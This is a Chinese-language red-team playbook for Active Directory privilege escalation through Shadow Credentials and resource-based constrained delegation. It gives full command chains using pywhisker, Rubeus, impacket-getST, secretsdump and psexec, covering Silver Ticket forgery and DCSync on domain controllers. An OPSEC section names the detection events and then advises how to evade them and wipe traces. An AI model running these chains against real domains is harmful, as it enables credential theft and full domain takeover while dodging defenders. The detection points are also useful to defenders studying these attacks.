# Shadow Credentials 与 RBCD 组合攻击

> 当 BloodHound 显示你对目标对象有 GenericWrite/GenericAll 权限时，Shadow Credentials 和 RBCD 是两条最隐蔽的提权路径。两者可以独立使用，也可以组合形成链式攻击。

---

## 1. Shadow Credentials 攻击详解

### 1.1 原理

```
Shadow Credentials 利用 Windows Hello for Business 的 Key Trust 机制：
├─ msDS-KeyCredentialLink 属性存储用户/计算机的公钥凭据
├─ 拥有该属性写权限 → 可以添加攻击者控制的密钥对
├─ 使用对应私钥通过 PKINIT 向 KDC 申请 TGT
├─ 整个过程不修改密码、不加入组 → OPSEC 友好
└─ 需要域内存在 ADCS（或域功能级别 >= Windows Server 2016）
```

### 1.2 前提条件

```
必要条件检查：
├─ 权限: GenericWrite / GenericAll / WriteProperty(msDS-KeyCredentialLink) on target
├─ ADCS: 域内至少一个 Enterprise CA（PKINIT 需要证书服务）
│   └─ 检查: certutil -TCAInfo  或  certipy find -dc-ip DC_IP -u user -p pass
├─ 域功能级别: >= Windows Server 2016（支持 Key Trust）
│   └─ 检查: Get-ADDomain | Select DomainMode
└─ 网络: 能访问 DC 的 LDAP(S) 端口（389/636）
```

### 1.3 完整利用步骤

```bash
# ===== Linux 攻击链（pywhisker + PKINITtools）=====

# 步骤 1: 添加 Shadow Credential
python3 pywhisker.py -d corp.local -u attacker -p 'P@ssw0rd' \
  --target victim_user --action add --dc-ip 10.10.10.1
# 输出: PFX 文件路径 + 密码 + DeviceID

# 步骤 2: PKINIT 获取 TGT
python3 gettgtpkinit.py -cert-pfx ./output.pfx -pfx-pass 'generated_pass' \
  corp.local/victim_user victim.ccache -dc-ip 10.10.10.1
# 输出: AS-REP encryption key + TGT ccache 文件

# 步骤 3: 使用 U2U 获取 NT Hash（可选但推荐）
export KRB5CCNAME=victim.ccache
python3 getnthash.py -key <AS_REP_KEY> corp.local/victim_user -dc-ip 10.10.10.1
# 输出: victim_user 的 NTLM hash

# 步骤 4: 利用获得的凭据
# 方式A: Pass-the-Hash
netexec smb 10.10.10.1 -u victim_user -H <NTHASH> --shares
# 方式B: Pass-the-Ticket
export KRB5CCNAME=victim.ccache
impacket-secretsdump -k -no-pass corp.local/victim_user@DC01.corp.local
```

```bash
# ===== Windows 攻击链（Whisker + Rubeus）=====

# 步骤 1: 添加 Key Credential
.\Whisker.exe add /target:victim_user /domain:corp.local /dc:DC01.corp.local
# 输出: Rubeus 命令和 Base64 证书

# 步骤 2: 使用 Rubeus 获取 TGT
.\Rubeus.exe asktgt /user:victim_user /certificate:<BASE64_CERT> \
  /password:<CERT_PASS> /domain:corp.local /dc:DC01.corp.local /getcredentials /show
# 输出: TGT + NTLM hash

# 步骤 3: Pass-the-Ticket
.\Rubeus.exe ptt /ticket:<BASE64_TGT>
```

### 1.4 PKINIT 认证流程

```
攻击者                          KDC (Domain Controller)
   │                                    │
   │ ── AS-REQ (PKINIT PA-DATA) ──────> │
   │    包含: 证书 + 签名               │
   │    (用 msDS-KeyCredentialLink      │
   │     中的私钥签名)                   │
   │                                    │
   │ <── AS-REP ─────────────────────── │
   │    包含: TGT + 加密的 session key  │
   │    (KDC 验证公钥匹配后签发)        │
   │                                    │
   │ ── TGS-REQ (使用 TGT) ──────────> │
   │                                    │
   │ <── TGS-REP (服务票据) ──────────  │
   │                                    │
```

### 1.5 与 ADCS 的关系

```
Shadow Credentials vs ADCS 证书攻击:
├─ Shadow Creds: 利用 Key Trust（msDS-KeyCredentialLink）
│   └─ 需要对目标的写权限
├─ ADCS ESC1-ESC8: 利用证书模板配置错误
│   └─ 需要有漏洞的证书模板
├─ 共同点: 都通过 PKINIT 获取 TGT
├─ 区别: Shadow Creds 写属性，ADCS 申请证书
└─ 当 ADCS 不存在时: Shadow Creds 不可用 → 转用 RBCD
```

---

## 2. Resource-Based Constrained Delegation (RBCD) 攻击详解

### 2.1 原理

```
RBCD 利用 Kerberos 委派机制:
├─ msDS-AllowedToActOnBehalfOfOtherIdentity 属性
│   定义: 哪些账户可以代表其他用户访问本计算机
├─ 区别于传统约束委派: RBCD 在目标机器上配置，而非源机器
├─ 攻击逻辑:
│   1. 控制一个有 SPN 的账户（通常是机器账户）
│   2. 将该账户写入目标的 msDS-AllowedToActOnBehalfOfOtherIdentity
│   3. S4U2Self: 以任意用户身份获取到攻击者机器的 ST
│   4. S4U2Proxy: 将该 ST 转发为访问目标服务的 ST
│   5. 使用 Administrator 的服务票据访问目标
└─ 整个过程不需要知道 Administrator 的密码
```

### 2.2 前提条件

```
必要条件:
├─ 权限: GenericWrite / GenericAll / WriteProperty 在目标计算机对象上
├─ SPN 账户: 需要控制一个有 SPN 的账户
│   ├─ 方式1: 创建机器账户（MAQ > 0，默认值 10）
│   │   └─ 检查: Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
│   ├─ 方式2: 已控制的现有计算机账户
│   └─ 方式3: 已控制的有 SPN 的服务账户
└─ 网络: 能访问 DC 的 Kerberos (88) + LDAP (389)
```

### 2.3 完整利用链

```bash
# ===== 完整 RBCD 攻击链 =====

# 步骤 1: 创建机器账户（如果 MAQ > 0）
impacket-addcomputer corp.local/attacker:'P@ssw0rd' \
  -computer-name 'EVIL$' -computer-pass 'EvilP@ss123!' -dc-ip 10.10.10.1
# 验证: 新机器账户自动获得 SPN (HOST/EVIL, RestrictedKrbHost/EVIL)

# 步骤 2: 配置 RBCD — 允许 EVIL$ 代表任何用户访问 TARGET$
# 方式A: impacket-rbcd
impacket-rbcd corp.local/attacker:'P@ssw0rd' -dc-ip 10.10.10.1 \
  -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action write

# 方式B: rbcd.py
python3 rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' \
  -action write 'corp.local/attacker:P@ssw0rd' -dc-ip 10.10.10.1

# 方式C: PowerShell (域内)
Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount EVIL$

# 步骤 3: S4U2Self + S4U2Proxy 获取 Administrator 的服务票据
impacket-getST corp.local/'EVIL$':'EvilP@ss123!' \
  -spn cifs/TARGET.corp.local \
  -impersonate Administrator \
  -dc-ip 10.10.10.1
# 输出: Administrator@cifs_TARGET.corp.local.ccache

# 步骤 4: 使用服务票据访问目标
export KRB5CCNAME=Administrator@cifs_TARGET.corp.local.ccache

# 远程执行
impacket-psexec -k -no-pass TARGET.corp.local
impacket-wmiexec -k -no-pass TARGET.corp.local
impacket-smbexec -k -no-pass TARGET.corp.local

# 凭据提取
impacket-secretsdump -k -no-pass TARGET.corp.local
```

### 2.4 S4U 协议详解

```
S4U2Self + S4U2Proxy 流程:

攻击者(EVIL$)              KDC                     TARGET
     │                       │                        │
     │ ── S4U2Self ────────> │                        │
     │    "我是 EVIL$,       │                        │
     │     请给我一张         │                        │
     │     Administrator      │                        │
     │     访问 EVIL$ 的 ST" │                        │
     │                       │                        │
     │ <── Forwardable ST ── │                        │
     │    (Admin → EVIL$)    │                        │
     │                       │                        │
     │ ── S4U2Proxy ───────> │                        │
     │    "请将这张 ST       │                        │
     │     转换为 Admin      │                        │
     │     访问 cifs/TARGET  │                        │
     │     的 ST"            │                        │
     │                       │ (检查 RBCD 配置)       │
     │ <── Service Ticket ── │                        │
     │    (Admin → TARGET)   │                        │
     │                       │                        │
     │ ── CIFS/SMB ──────────────────────────────────> │
     │    使用 Admin 的 ST   │                        │
```

### 2.5 从计算机账户凭据到管理员 Shell

获取计算机账户的 TGT 或 NT hash 后（通过 Shadow Credentials 或其他方式），有多种路径获取管理员权限。

#### S4U2Self + altservice

```bash
# 使用计算机账户的 TGT 通过 S4U2Self 获取 Administrator 的服务票据
export KRB5CCNAME=computer.ccache

# -self: S4U2Self（为自己请求其他用户的 ST）
# -altservice: 指定目标服务（CIFS 用于文件访问、HOST 用于 WMI/PsExec）
impacket-getST -self -impersonate 'Administrator' \
  -altservice 'CIFS/target.domain.local' \
  -k -no-pass -dc-ip DC_IP 'domain.local'/'computer$'

# 使用获取的 Administrator ST
export KRB5CCNAME=Administrator@CIFS_target.domain.local@DOMAIN.LOCAL.ccache
impacket-wmiexec -k -no-pass domain.local/Administrator@target.domain.local
impacket-smbclient -k -no-pass target.domain.local
```

#### Silver Ticket

```bash
# 当拥有计算机账户的 NT hash 时，可以伪造 Silver Ticket
# Silver Ticket 不经过 DC 验证 → 不产生 4769 事件

# 1. 获取域 SID
impacket-lookupsid 'domain.local'/'computer$'@target.domain.local 0 \
  -hashes ':NTLM_HASH'

# 2. 伪造 CIFS 服务的 Silver Ticket
impacket-ticketer -domain-sid 'S-1-5-21-xxx-xxx-xxx' \
  -domain 'domain.local' \
  -spn 'CIFS/target.domain.local' \
  -nthash 'NTLM_HASH' \
  Administrator

# 3. 使用伪造票据
export KRB5CCNAME=Administrator.ccache
impacket-wmiexec -k -no-pass domain.local/Administrator@target.domain.local
impacket-secretsdump -k -no-pass target.domain.local
```

#### 域控的特殊情况

```bash
# 如果目标计算机是域控制器 → 获取其机器账户后可直接 DCSync
# 使用 DC 机器账户 hash
impacket-secretsdump -hashes ':NTLM_HASH' 'domain.local'/'DC01$'@dc01.domain.local

# 或使用 DC 机器账户 TGT
export KRB5CCNAME=dc01.ccache
impacket-secretsdump -k -no-pass domain.local/'DC01$'@dc01.domain.local
```

---

## 3. 组合攻击

### 3.1 Shadow Credentials + RBCD 连锁

```
场景: 你有对用户 A 的 GenericWrite，A 有对计算机 B 的 GenericAll
攻击链:
├─ 步骤 1: Shadow Creds on A → 获取 A 的 TGT/Hash
├─ 步骤 2: 使用 A 的身份对 B 配置 RBCD
├─ 步骤 3: RBCD 攻击 → 获取 B 的 Administrator 访问
└─ 步骤 4: 如果 B 是 DC → DCSync → 域管
```

```bash
# 实战: A=svc_backup, B=DC01

# 1. Shadow Creds → 获取 svc_backup 的凭据
python3 pywhisker.py -d corp.local -u attacker -p 'P@ss' \
  --target svc_backup --action add --dc-ip 10.10.10.1
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass 'xxx' \
  corp.local/svc_backup svc.ccache -dc-ip 10.10.10.1

# 2. 使用 svc_backup 身份配置 RBCD on DC01
export KRB5CCNAME=svc.ccache
impacket-addcomputer corp.local/svc_backup -k -no-pass \
  -computer-name 'ATK$' -computer-pass 'AtkP@ss' -dc-ip 10.10.10.1
impacket-rbcd corp.local/svc_backup -k -no-pass -dc-ip 10.10.10.1 \
  -delegate-to 'DC01$' -delegate-from 'ATK$' -action write

# 3. RBCD → DC01 Administrator
impacket-getST corp.local/'ATK$':'AtkP@ss' \
  -spn cifs/DC01.corp.local -impersonate Administrator -dc-ip 10.10.10.1
export KRB5CCNAME=Administrator@cifs_DC01.corp.local.ccache
impacket-secretsdump -k -no-pass DC01.corp.local -just-dc-ntlm
```

### 3.2 WriteDACL → GenericAll → Shadow Creds

```
场景: WriteDACL on target user → 无法直接利用
攻击链:
├─ 步骤 1: WriteDACL → 给自己加 GenericAll
├─ 步骤 2: GenericAll → Shadow Credentials
├─ 步骤 3: PKINIT → TGT → 横向移动
└─ 步骤 4: 清理 ACE + 清理 Key Credential
```

```bash
# 1. WriteDACL → GenericAll
dacledit.py -dc-ip 10.10.10.1 corp.local/attacker:'P@ss' \
  -target victim_user -action write -rights FullControl -principal attacker

# 2. GenericAll → Shadow Creds
python3 pywhisker.py -d corp.local -u attacker -p 'P@ss' \
  --target victim_user --action add --dc-ip 10.10.10.1

# 3. 获取凭据并利用
python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass 'xxx' \
  corp.local/victim_user victim.ccache -dc-ip 10.10.10.1

# 4. 清理（逆序）
python3 pywhisker.py -d corp.local -u attacker -p 'P@ss' \
  --target victim_user --action remove --device-id <DEVICE_ID> --dc-ip 10.10.10.1
dacledit.py -dc-ip 10.10.10.1 corp.local/attacker:'P@ss' \
  -target victim_user -action remove -rights FullControl -principal attacker
```

### 3.3 从 GenericWrite 到 Domain Admin 的最短路径

```
决策树:

GenericWrite on ?
│
├─ User Object
│   ├─ [首选] Shadow Credentials → PKINIT → TGT
│   ├─ [备选] Targeted Kerberoasting → 设置 SPN → 破解
│   └─ [备选] 修改 logonScript → 等待用户登录
│
├─ Computer Object
│   ├─ [首选] RBCD → S4U → 管理员服务票据
│   ├─ [备选] Shadow Credentials → PKINIT → 计算机 TGT
│   │   └─ 如果是 DC 的计算机账户 → DCSync
│   └─ [备选] 读 LAPS 密码（如果安装了 LAPS）
│
├─ Group Object
│   └─ 将自己加入该组 → 继承组权限
│
└─ GPO Object
    └─ GPO 滥用 → 推送恶意策略到关联 OU
```

---

## 4. OPSEC 分析

### 4.1 Shadow Credentials 检测

```
检测点:
├─ Windows Security Event 4662:
│   ├─ ObjectType: msDS-KeyCredentialLink
│   ├─ Operation: Write Property
│   └─ 关注: 非 ADCS 服务账户修改此属性 = 异常
│
├─ Windows Security Event 4768:
│   ├─ Certificate Information 不为空
│   ├─ Pre-Authentication Type: PKINIT
│   └─ 关注: 用户账户使用证书认证（通常只有计算机使用）
│
├─ LDAP 审计:
│   └─ 对 msDS-KeyCredentialLink 的写操作
│
└─ BloodHound:
    └─ AddKeyCredentialLink edge 关系

OPSEC 建议:
├─ 操作完成后立即清理 Key Credential
├─ 选择在正常 ADCS 活动期间操作（混入合法证书操作）
├─ 避免对高价值目标（DA/EA）直接操作
└─ 使用中间跳板账户，不直接从已知攻击者账户操作
```

### 4.2 RBCD 检测

```
检测点:
├─ Windows Security Event 4662:
│   ├─ ObjectType: msDS-AllowedToActOnBehalfOfOtherIdentity
│   ├─ Operation: Write Property
│   └─ 关注: 非管理员修改委派配置
│
├─ Windows Security Event 4741:
│   └─ 新计算机账户创建（MAQ 利用）
│   └─ 关注: 非 IT 管理员创建机器账户
│
├─ Kerberos 审计 (4769):
│   ├─ S4U2Proxy 请求
│   └─ 关注: 新创建的机器账户发起 S4U
│
└─ BloodHound:
    └─ AllowedToAct edge 关系

OPSEC 建议:
├─ 如果可能，使用已有的受控机器账户（避免创建新账户）
├─ 机器账户名称模仿目标环境的命名规范
├─ 操作完成后清理 RBCD 配置 + 删除机器账户
├─ 避免在短时间内创建账户+配置委派+S4U（行为链特征）
└─ 在委派配置和实际利用之间增加时间间隔
```

### 4.3 完整清理流程

```bash
# ===== Shadow Credentials 清理 =====

# 列出所有 Key Credentials
python3 pywhisker.py -d corp.local -u attacker -p 'P@ss' \
  --target victim --action list --dc-ip 10.10.10.1

# 删除指定 DeviceID
python3 pywhisker.py -d corp.local -u attacker -p 'P@ss' \
  --target victim --action remove --device-id <DEVICE_ID> --dc-ip 10.10.10.1

# Windows: Whisker 清理
.\Whisker.exe remove /target:victim /deviceid:<DEVICE_ID> /domain:corp.local

# ===== RBCD 清理 =====

# 清空 RBCD 配置
impacket-rbcd corp.local/attacker:'P@ss' -dc-ip 10.10.10.1 \
  -delegate-to 'TARGET$' -delegate-from 'EVIL$' -action flush

# 或 PowerShell
Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount $null

# 删除创建的机器账户（需要对应权限）
impacket-addcomputer corp.local/attacker:'P@ss' -dc-ip 10.10.10.1 \
  -computer-name 'EVIL$' -computer-pass 'EvilP@ss123!' -delete

# ===== ACL 清理 =====
dacledit.py -dc-ip 10.10.10.1 corp.local/attacker:'P@ss' \
  -target victim -action remove -rights FullControl -principal attacker
```

---

## 5. 工具速查

| 工具 | 平台 | 用途 |
|------|------|------|
| pywhisker | Linux | Shadow Credentials 管理 |
| Whisker | Windows (.NET) | Shadow Credentials 管理 |
| PKINITtools (gettgtpkinit/getnthash) | Linux | PKINIT 获取 TGT/Hash |
| Rubeus | Windows (.NET) | Kerberos 操作（含 PKINIT） |
| impacket-rbcd | Linux | RBCD 配置 |
| impacket-getST | Linux | S4U2Self + S4U2Proxy |
| impacket-addcomputer | Linux | 创建/删除机器账户 |
| dacledit.py | Linux | ACL 读写 |
| StandIn | Windows (.NET) | RBCD + 机器账户管理 |
| PowerView | Windows (PS) | AD 属性查询与修改 |
| bloodyAD | Linux | AD 属性操作（通用） |
| Certipy | Linux | ADCS + PKINIT 集成 |

---

## 关联参考

- **ACE 权限位详解与完整滥用链** → `ace-abuse-chains.md`
